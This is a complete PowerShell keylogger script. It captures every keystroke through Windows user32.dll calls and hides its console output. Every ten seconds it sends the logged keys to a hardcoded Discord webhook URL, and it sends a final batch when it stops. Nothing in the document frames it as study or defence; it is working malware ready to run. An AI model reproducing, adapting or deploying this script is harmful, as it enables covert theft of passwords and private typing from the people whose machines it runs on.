#requires -Version 2
function Start-KeyLogger() 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # Load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # Discord webhook URL
  $dc = 'https://discord.com/api/webhooks/1321909727935991908/3Ij5e0nJRJEiIyucAsphE-K2Mh2OiugdIPCssnBRbWDUKUiczpQiqC9RnRCBASFeNg6W'

  # Function to send messages to Discord
  function Send-Discord($message) {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('Content-Type','application/json')
    $wc.Encoding = [System.Text.Encoding]::UTF8
    try {
        $wc.UploadString($dc, (ConvertTo-Json @{content=$message})) | Out-Null
    } catch {
        Write-Host "Failed to send data to Discord. Error: $_" | Out-Null
    }
  }

  $log = ""
  $timer = [System.Diagnostics.Stopwatch]::StartNew()

  try
  {
    # Suppress console output
    Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red | Out-Null

    # Send debug message to Discord indicating script has started
    Send-Discord "Keylogger script started at $(Get-Date)"

    while ($true) {
      Start-Sleep -Milliseconds 50
      
      # Scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # Is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # Translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # Get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # Prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # Translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success -and ([char]::IsLetterOrDigit($mychar.ToString()) -or [char]::IsPunctuation($mychar.ToString()) -or [char]::IsWhiteSpace($mychar.ToString()))) {
            # Suppress debug output
            Write-Host "Captured: $($mychar.ToString())" | Out-Null
            $log += $mychar.ToString()
          }
        }
      }

      # Check if 10 seconds have passed
      if ($timer.Elapsed.TotalSeconds -ge 10) {
        if ($log -ne "") {
          Send-Discord "$(Get-Date): Keys logged - $log"
          $log = ""
        }
        $timer.Restart()
      }
    }
  }
  finally
  {
    # If there's any remaining log data when stopping, send it
    if ($log -ne "") {
      Send-Discord "$(Get-Date): Final keys logged - $log"
    }
    Write-Host "Keylogger stopped." | Out-Null
  }
}

# Start the key logger
Start-KeyLogger
